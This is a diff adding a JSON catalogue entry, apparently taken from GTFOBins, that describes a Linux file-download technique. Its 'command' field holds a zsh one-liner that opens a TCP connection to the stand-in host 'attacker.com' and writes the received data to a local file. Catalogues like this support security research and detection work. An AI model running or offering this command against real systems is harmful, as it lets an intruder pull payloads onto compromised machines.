@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-zsh-download",
+  "name": "GTFOBins · zsh (download)",
+  "command": "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n \"$(<&$REPLY)\" >/path/to/output-file'",
+  "description": "Use zsh to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "zsh",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/zsh/#download",
+  "upstream_id": "zsh/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/zsh/"
+    }
+  ]
+}
